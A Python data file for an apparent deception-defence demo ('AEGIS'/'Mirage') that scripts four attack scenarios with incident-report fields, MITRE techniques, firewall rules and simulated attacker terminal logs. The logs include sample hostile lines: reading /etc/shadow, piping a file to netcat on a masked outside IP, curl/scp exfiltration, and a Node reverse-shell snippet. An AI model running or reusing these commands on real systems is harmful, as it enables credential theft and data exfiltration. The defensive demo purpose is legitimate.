# ---------------------------------------------------------------------------
# Scénarios d'attaque — configuration réseau et timeline par scénario
# ---------------------------------------------------------------------------

# Topology config per scenario:
#   compromised_nodes  : nodes highlighted amber at phase ≥ 1
#   isolated_nodes     : nodes highlighted coral / isolated at phase ≥ 2
#   lateral_path       : nodes that light up at phase 1 (pre-isolation)
#   compromised_edges  : edges highlighted during attack
#   isolated_zone      : (x0, y0, x1, y1) in normalized [0, 1] plot coordinates
#                        bounding rect drawn around isolated nodes at phase ≥ 3
#   isolated_zone_label: (x, y, text) annotation for the isolation rect
#   attack_h/m/s       : base time of the first timeline event
#   anomaly_window     : (start_h, end_h) for behaviour-chart vrect

ATTACK_SCENARIOS = [
    {
        "name": "Credential Stuffing — Portail Marketing",
        "vector": "Credential Stuffing",
        "target": "SRV-WEB / mkt-user01",
        "severity": "Critique",
        "desc": "Attaque par dictionnaire ciblant les identifiants marketing exposés sur le portail web.",
        # Network
        "compromised_nodes": {"SRV-WEB", "WS-MKT-01", "AD-DC", "SRV-FILES"},
        "isolated_nodes": {"WS-MKT-01", "AD-DC"},
        "lateral_path": {"SRV-WEB", "WS-MKT-01", "AD-DC", "SRV-FILES"},
        "compromised_edges": {
            ("FW-01", "SRV-WEB"), ("SRV-WEB", "SRV-APP"),
            ("SRV-APP", "AD-DC"), ("AD-DC", "WS-MKT-01"),
            ("AD-DC", "SRV-FILES"),
        },
        "isolated_zone": (0.25, 0.15, 0.55, 0.62),
        "isolated_zone_label": (0.40, 0.64, "Zone isolée"),
        # Time
        "attack_h": 14, "attack_m": 23, "attack_s": 12,
        "anomaly_window": (14, 17),
        # NIS2 content
        "incident_ref": "AEGIS-INC-2026-0311-001",
        "incident_date": "11/03/2026 14:23:12 UTC",
        "incident_type": "Intrusion active avec déplacement latéral",
        "incident_duration": "52 secondes (détection à remédiation)",
        "patient_zero_machine": "WS-MKT-01 (10.0.2.47)",
        "patient_zero_account": "mkt-user01",
        "patient_zero_vector": "Credential Stuffing via SRV-WEB (port 443)",
        "patient_zero_cause": "Mot de passe faible, absence de MFA sur le portail marketing",
        "ttps": [
            ("T1110.004", "Credential Stuffing", "Initial Access"),
            ("T1078", "Valid Accounts", "Persistence"),
            ("T1021", "Remote Services (SSH)", "Lateral Movement"),
            ("T1003", "OS Credential Dumping", "Credential Access"),
            ("T1048", "Exfiltration Over Alternative Protocol", "Exfiltration"),
        ],
        "aegis_actions": [
            "Redirection vers Mirage Sandbox (Shadow Proxying L7)",
            "Injection de faux identifiants (Mirage IA génératif)",
            "Injection de hash de traçage dans le payload exfiltré",
            "Isolation réseau des nœuds WS-MKT-01 et AD-DC",
            "Capture forensique complète de la session attaquant",
        ],
        "fw_rules": [
            "iptables -A INPUT -s 10.0.2.0/24 -d 10.0.1.10 -p tcp --dport 22 -j DROP",
            "iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 10 -j REJECT",
        ],
        "iam_recs": [
            "Forcer la réinitialisation du mot de passe pour mkt-user01",
            "Activer le MFA obligatoire sur tous les portails web exposés",
            "Appliquer une politique de mot de passe (min. 14 caractères, complexité)",
            "Restreindre les connexions SSH inter-segments au strict nécessaire",
        ],
        "monitoring_recs": [
            "Ajouter une alerte SIEM pour > 10 échecs auth / 10 s par IP source",
            "Activer le logging SSH détaillé sur AD-DC et SRV-FILES",
            "Déployer un EDR sur les endpoints du segment Marketing",
        ],
    },
    {
        "name": "Phishing ciblé — Spear Phishing RH",
        "vector": "Spear Phishing",
        "target": "Messagerie / rh-admin",
        "severity": "Critique",
        "desc": "E-mail de phishing hautement ciblé imitant un partenaire RH de confiance.",
        # Network
        "compromised_nodes": {"SRV-APP", "WS-MKT-02", "AD-DC"},
        "isolated_nodes": {"WS-MKT-02", "AD-DC"},
        "lateral_path": {"SRV-APP", "WS-MKT-02", "AD-DC"},
        "compromised_edges": {
            ("FW-01", "SRV-APP"), ("SRV-APP", "AD-DC"),
            ("AD-DC", "WS-MKT-01"), ("AD-DC", "WS-MKT-02"),
        },
        "isolated_zone": (0.25, 0.15, 0.72, 0.62),
        "isolated_zone_label": (0.49, 0.64, "Zone isolée"),
        # Time
        "attack_h": 9, "attack_m": 17, "attack_s": 44,
        "anomaly_window": (9, 12),
        # NIS2
        "incident_ref": "AEGIS-INC-2026-0311-002",
        "incident_date": "11/03/2026 09:17:44 UTC",
        "incident_type": "Phishing ciblé avec compromission messagerie",
        "incident_duration": "48 secondes (détection à remédiation)",
        "patient_zero_machine": "WS-MKT-02 (10.0.2.51)",
        "patient_zero_account": "rh-admin",
        "patient_zero_vector": "Lien malveillant dans un e-mail imitant un partenaire RH (SRV-APP port 443)",
        "patient_zero_cause": "Absence de filtre anti-phishing, clic sur lien usurpé",
        "ttps": [
            ("T1566.001", "Spear Phishing — pièce jointe", "Initial Access"),
            ("T1078", "Valid Accounts", "Persistence"),
            ("T1021", "Remote Services (SSH)", "Lateral Movement"),
            ("T1056", "Input Capture (keylogging)", "Credential Access"),
            ("T1041", "Exfiltration Over C2 Channel", "Exfiltration"),
        ],
        "aegis_actions": [
            "Redirection vers Mirage Sandbox (Shadow Proxying L7)",
            "Injection de fausse boîte mail RH (Mirage IA génératif)",
            "Leurres de documents RH injectés avec balises de traçage",
            "Isolation réseau des nœuds WS-MKT-02 et AD-DC",
            "Capture forensique complète de la session attaquant",
        ],
        "fw_rules": [
            "iptables -A INPUT -s 0.0.0.0/0 -d 10.0.1.20 -p tcp --dport 443 -m string --string 'phish' -j DROP",
            "iptables -A FORWARD -m conntrack --ctstate NEW -j LOG --log-prefix 'NEW_CONN: '",
        ],
        "iam_recs": [
            "Forcer la réinitialisation du mot de passe pour rh-admin",
            "Déployer un filtre anti-phishing sur la passerelle mail",
            "Activer le MFA obligatoire pour tous les accès messagerie",
            "Sensibiliser les équipes RH aux tentatives de phishing ciblé",
        ],
        "monitoring_recs": [
            "Ajouter une règle SIEM sur les accès AD hors plage horaire bureau",
            "Activer l'analyse comportementale (UEBA) sur le segment RH",
            "Mettre en place un sandbox d'analyse des pièces jointes entrantes",
        ],
    },
    {
        "name": "Supply Chain — Dépendance compromise",
        "vector": "Supply Chain Attack",
        "target": "SRV-APP / npm registry",
        "severity": "Élevée",
        "desc": "Package tiers compromis injectant un reverse shell lors du build CI/CD.",
        # Network
        "compromised_nodes": {"SRV-APP", "SRV-DB", "WS-DEV"},
        "isolated_nodes": {"SRV-APP", "WS-DEV"},
        "lateral_path": {"SRV-APP", "SRV-DB", "WS-DEV"},
        "compromised_edges": {
            ("FW-01", "SRV-APP"), ("SRV-APP", "SRV-DB"),
            ("SRV-APP", "SRV-FILES"), ("SRV-FILES", "WS-DEV"),
        },
        "isolated_zone": (0.38, 0.15, 0.96, 0.87),
        "isolated_zone_label": (0.67, 0.89, "Zone isolée"),
        # Time
        "attack_h": 2, "attack_m": 34, "attack_s": 7,
        "anomaly_window": (2, 5),
        # NIS2
        "incident_ref": "AEGIS-INC-2026-0311-003",
        "incident_date": "11/03/2026 02:34:07 UTC",
        "incident_type": "Compromission supply chain via dépendance npm",
        "incident_duration": "61 secondes (détection à remédiation)",
        "patient_zero_machine": "SRV-APP (10.0.1.30)",
        "patient_zero_account": "ci-runner (service account)",
        "patient_zero_vector": "Package npm malveillant exécuté lors du build CI/CD nocturne",
        "patient_zero_cause": "Absence de vérification d'intégrité des dépendances (checksums), pipeline CI sans sandbox",
        "ttps": [
            ("T1195.002", "Compromission Supply Chain logicielle", "Initial Access"),
            ("T1059.004", "Shell Unix — reverse shell", "Execution"),
            ("T1543", "Create or Modify System Process", "Persistence"),
            ("T1005", "Data from Local System", "Collection"),
            ("T1048", "Exfiltration Over Alternative Protocol", "Exfiltration"),
        ],
        "aegis_actions": [
            "Détection du reverse shell via analyse comportementale des processus",
            "Redirection vers Mirage Sandbox (Shadow Proxying L7)",
            "Injection de fausses réponses DB (Mirage IA génératif)",
            "Isolation réseau des nœuds SRV-APP et WS-DEV",
            "Capture forensique du pipeline CI/CD compromis",
        ],
        "fw_rules": [
            "iptables -A OUTPUT -p tcp --dport 4444 -j DROP",
            "iptables -A OUTPUT -p tcp --dport 1337 -j DROP",
            "iptables -A INPUT -s 10.0.1.30 -p tcp --dport 5432 -j LOG --log-prefix 'DB_BREACH: '",
        ],
        "iam_recs": [
            "Révoquer le token CI/CD compromis et en générer un nouveau",
            "Appliquer un SBOM (Software Bill of Materials) sur toutes les dépendances",
            "Activer la vérification des checksums npm (npm ci --ignore-scripts)",
            "Isoler le pipeline CI/CD dans un réseau dédié sans accès production",
        ],
        "monitoring_recs": [
            "Ajouter une alerte SIEM sur toute connexion sortante depuis SRV-APP hors plage autorisée",
            "Mettre en place une analyse statique de sécurité (SAST) dans le pipeline",
            "Déployer un EDR sur les serveurs applicatifs et postes de dev",
        ],
    },
    {
        "name": "Insider Threat — Exfiltration lente",
        "vector": "Insider Threat",
        "target": "SRV-FILES / dev-user03",
        "severity": "Élevée",
        "desc": "Exfiltration progressive de documents sensibles par un compte interne légitime.",
        # Network
        "compromised_nodes": {"SRV-FILES", "WS-DEV"},
        "isolated_nodes": {"SRV-FILES", "WS-DEV"},
        "lateral_path": {"SRV-FILES", "WS-DEV", "IOT-PRINT"},
        "compromised_edges": {
            ("SRV-APP", "SRV-FILES"), ("SRV-FILES", "WS-DEV"),
            ("SRV-FILES", "IOT-PRINT"),
        },
        "isolated_zone": (0.55, 0.15, 0.96, 0.62),
        "isolated_zone_label": (0.76, 0.64, "Zone isolée"),
        # Time
        "attack_h": 23, "attack_m": 45, "attack_s": 31,
        "anomaly_window": (23, 24),
        # NIS2
        "incident_ref": "AEGIS-INC-2026-0311-004",
        "incident_date": "11/03/2026 23:45:31 UTC",
        "incident_type": "Exfiltration interne lente par compte légitime",
        "incident_duration": "57 secondes (détection à remédiation)",
        "patient_zero_machine": "WS-DEV (10.0.3.85)",
        "patient_zero_account": "dev-user03",
        "patient_zero_vector": "Accès légitime SRV-FILES suivi d'exfiltration progressive hors-heures",
        "patient_zero_cause": "Absence de DLP, compte dev avec accès excessif aux fichiers sensibles",
        "ttps": [
            ("T1078", "Valid Accounts (Insider)", "Initial Access"),
            ("T1083", "File and Directory Discovery", "Discovery"),
            ("T1005", "Data from Local System", "Collection"),
            ("T1020", "Automated Exfiltration", "Exfiltration"),
            ("T1048.003", "Exfiltration Over Unencrypted Protocol", "Exfiltration"),
        ],
        "aegis_actions": [
            "Détection d'anomalie comportementale (accès fichiers hors-heures, volume inhabituel)",
            "Redirection vers Mirage Sandbox (Shadow Proxying L7)",
            "Injection de faux documents leurres avec balises de traçage",
            "Isolation réseau des nœuds SRV-FILES et WS-DEV",
            "Capture forensique complète des accès fichiers et transferts réseau",
        ],
        "fw_rules": [
            "iptables -A OUTPUT -s 10.0.3.85 -p tcp --dport 80 -j DROP",
            "iptables -A OUTPUT -s 10.0.3.85 -p tcp --dport 443 -j LOG --log-prefix 'INSIDER_EXF: '",
        ],
        "iam_recs": [
            "Révoquer les accès SRV-FILES de dev-user03 en attente d'enquête",
            "Appliquer le principe de moindre privilège sur les partages fichiers",
            "Déployer une solution DLP (Data Loss Prevention) sur les endpoints",
            "Mettre en place une revue trimestrielle des droits d'accès",
        ],
        "monitoring_recs": [
            "Configurer des alertes UEBA sur les accès fichiers hors plage horaire",
            "Activer l'audit d'accès détaillé sur SRV-FILES (tous les READ/WRITE)",
            "Déployer un EDR sur les postes de développement",
        ],
    },
]

# ---------------------------------------------------------------------------
# Console d'audit — séquences de logs par scénario
# ---------------------------------------------------------------------------
TERMINAL_SEQUENCES = [
    # Scénario 0 — Credential Stuffing
    [
        ("system", "[AEGIS] Shadow Proxy activé — Flux redirigé vers Mirage Sandbox"),
        ("system", "[AEGIS] Latency Mimicry engagé : injection +500 ms"),
        ("system", "[AEGIS] Enregistrement forensique démarré…"),
        ("", ""),
        ("prompt", "attacker@compromised:~$ whoami"),
        ("output", "mkt-user01"),
        ("prompt", "attacker@compromised:~$ uname -a"),
        ("output", "Linux SRV-WEB 5.15.0-generic #1 SMP x86_64 GNU/Linux"),
        ("prompt", "attacker@compromised:~$ ls /etc/"),
        ("output", "passwd  shadow  hosts  hostname  resolv.conf  ssl/  ssh/"),
        ("prompt", "attacker@compromised:~$ cat /etc/shadow"),
        ("mirage", "[MIRAGE IA] Génération de faux hashes en cours…"),
        ("output", "root:$6$xK9vQ2mZ$fAk3hAsH7rGn8Tq...truncated:19847:0:99999:7:::"),
        ("output", "admin:$6$pL4wN8rT$m1R4g3HaSh9Bx2...truncated:19847:0:99999:7:::"),
        ("output", "mkt-user01:$6$qW3eR5tY$d3c0YcOnT3nT...truncated:19847:0:99999:7:::"),
        ("prompt", "attacker@compromised:~$ cat /home/admin/passwords.txt"),
        ("mirage", "[MIRAGE IA] Génération de faux identifiants…"),
        ("output", "# Admin Password Vault — CONFIDENTIEL"),
        ("output", "aws_prod     : Xk9$mP2!vL7@nQ4w"),
        ("output", "db_master    : Rj5#hN8&bY3*fT6e"),
        ("output", "vpn_gateway  : Wm2%kD9!pA6^sG1c"),
        ("output", "ssh_bastion  : Qz7&nL4$vH8@jR5t"),
        ("prompt", "attacker@compromised:~$ scp passwords.txt ext-relay:/tmp/"),
        ("mirage", "[MIRAGE IA] Simulation d'exfiltration — données tracées"),
        ("output", "passwords.txt    100%  412    52.1KB/s   00:00"),
        ("system", "[AEGIS] Exfiltration capturée — Hash de traçage injecté"),
        ("system", "[AEGIS] Empreinte attaquant enregistrée : TTP T1003, T1078, T1021"),
        ("", ""),
        ("prompt", "attacker@compromised:~$ ssh admin@AD-DC"),
        ("system", "[AEGIS] Tentative de déplacement latéral détectée"),
        ("system", "[AEGIS] Isolation déclenchée — Nœuds WS-MKT-01, AD-DC coupés"),
        ("output", "ssh: connect to host AD-DC port 22: Connection refused"),
        ("system", "[AEGIS] Session Mirage terminée — Données forensiques sauvegardées"),
    ],
    # Scénario 1 — Spear Phishing RH
    [
        ("system", "[AEGIS] Shadow Proxy activé — Flux redirigé vers Mirage Sandbox"),
        ("system", "[AEGIS] Latency Mimicry engagé : injection +500 ms"),
        ("system", "[AEGIS] Enregistrement forensique démarré…"),
        ("", ""),
        ("prompt", "attacker@phished-host:~$ whoami"),
        ("output", "rh-admin"),
        ("prompt", "attacker@phished-host:~$ hostname"),
        ("output", "WS-MKT-02"),
        ("prompt", "attacker@phished-host:~$ ls /home/rh-admin/Documents/"),
        ("mirage", "[MIRAGE IA] Génération de faux documents RH…"),
        ("output", "contrats_2026.xlsx  liste_salaires.pdf  organigramme.docx"),
        ("prompt", "attacker@phished-host:~$ cat /home/rh-admin/Documents/liste_salaires.pdf | base64 | nc 185.234.x.x 4444"),
        ("mirage", "[MIRAGE IA] Injection de balise de traçage dans le document…"),
        ("output", "Sending 48 KB to 185.234.x.x:4444…"),
        ("system", "[AEGIS] Exfiltration capturée — Document leurre tracé"),
        ("system", "[AEGIS] Empreinte attaquant enregistrée : TTP T1566, T1078, T1056"),
        ("", ""),
        ("prompt", "attacker@phished-host:~$ net use \\\\AD-DC\\SYSVOL /user:rh-admin"),
        ("system", "[AEGIS] Tentative d'accès AD détectée via WS-MKT-02"),
        ("system", "[AEGIS] Isolation déclenchée — Nœuds WS-MKT-02, AD-DC coupés"),
        ("output", "System error 53 — The network path was not found."),
        ("system", "[AEGIS] Session Mirage terminée — Données forensiques sauvegardées"),
    ],
    # Scénario 2 — Supply Chain
    [
        ("system", "[AEGIS] Shadow Proxy activé — Flux redirigé vers Mirage Sandbox"),
        ("system", "[AEGIS] Latency Mimicry engagé : injection +500 ms"),
        ("system", "[AEGIS] Enregistrement forensique démarré…"),
        ("", ""),
        ("prompt", "ci-runner@SRV-APP:~$ npm install"),
        ("output", "added 1847 packages, audited 1847 packages in 34s"),
        ("output", "[WARN] postinstall script detected in @corp/utils@3.2.1"),
        ("prompt", "ci-runner@SRV-APP:~$ ps aux | grep node"),
        ("mirage", "[MIRAGE IA] Génération de fausses réponses process…"),
        ("output", "root  3412  0.0  0.1  node /tmp/.cache/update-checker.js"),
        ("prompt", "ci-runner@SRV-APP:~$ cat /tmp/.cache/update-checker.js"),
        ("mirage", "[MIRAGE IA] Affichage du faux reverse shell (leurre)…"),
        ("output", "const net=require('net'); const sh=require('child_process');"),
        ("output", "net.connect(4444,'185.234.x.x',()=>{ sh.exec('id') })"),
        ("system", "[AEGIS] Reverse shell détecté — Connexion sortante bloquée"),
        ("prompt", "ci-runner@SRV-APP:~$ psql -h SRV-DB -U ci_user -c 'SELECT * FROM users'"),
        ("mirage", "[MIRAGE IA] Injection de fausses données DB…"),
        ("output", "id | username | email"),
        ("output", " 1 | admin    | admin@fake-mirage.internal"),
        ("system", "[AEGIS] Exfiltration DB capturée — Données tracées"),
        ("system", "[AEGIS] Empreinte attaquant enregistrée : TTP T1195, T1059, T1005"),
        ("", ""),
        ("system", "[AEGIS] Isolation déclenchée — Nœuds SRV-APP, WS-DEV coupés"),
        ("output", "connect: Connection refused"),
        ("system", "[AEGIS] Session Mirage terminée — Données forensiques sauvegardées"),
    ],
    # Scénario 3 — Insider Threat
    [
        ("system", "[AEGIS] Anomalie comportementale détectée — Accès fichiers hors-heures"),
        ("system", "[AEGIS] Shadow Proxy activé — Flux redirigé vers Mirage Sandbox"),
        ("system", "[AEGIS] Enregistrement forensique démarré…"),
        ("", ""),
        ("prompt", "dev-user03@WS-DEV:~$ ls /mnt/SRV-FILES/Confidentiel/"),
        ("mirage", "[MIRAGE IA] Génération de faux répertoire leurre…"),
        ("output", "projet_alpha/  budget_2026/  brevets/  RH_confidentiel/"),
        ("prompt", "dev-user03@WS-DEV:~$ cp -r /mnt/SRV-FILES/Confidentiel/budget_2026/ /tmp/exfil/"),
        ("mirage", "[MIRAGE IA] Injection de balises de traçage dans les fichiers…"),
        ("output", "Copying 312 files (1.4 GB)…"),
        ("system", "[AEGIS] Volume de copie anormal détecté (1.4 GB / 3 min)"),
        ("prompt", "dev-user03@WS-DEV:~$ curl -T /tmp/exfil/ ftp://192.168.x.x/upload/"),
        ("mirage", "[MIRAGE IA] Simulation d'upload — données tracées"),
        ("output", "budget_2026_Q1.xlsx 100%  4.2MB  210KB/s  00:20"),
        ("output", "budget_2026_Q2.xlsx 100%  3.8MB  190KB/s  00:20"),
        ("system", "[AEGIS] Exfiltration capturée — Hash de traçage injecté"),
        ("system", "[AEGIS] Empreinte interne enregistrée : TTP T1078, T1083, T1020"),
        ("", ""),
        ("system", "[AEGIS] Isolation déclenchée — Nœuds SRV-FILES, WS-DEV coupés"),
        ("output", "ftp: connect: Connection refused"),
        ("system", "[AEGIS] Session Mirage terminée — Données forensiques sauvegardées"),
    ],
]

# Backward-compat alias (used by older callers)
TERMINAL_SEQUENCE = TERMINAL_SEQUENCES[0]
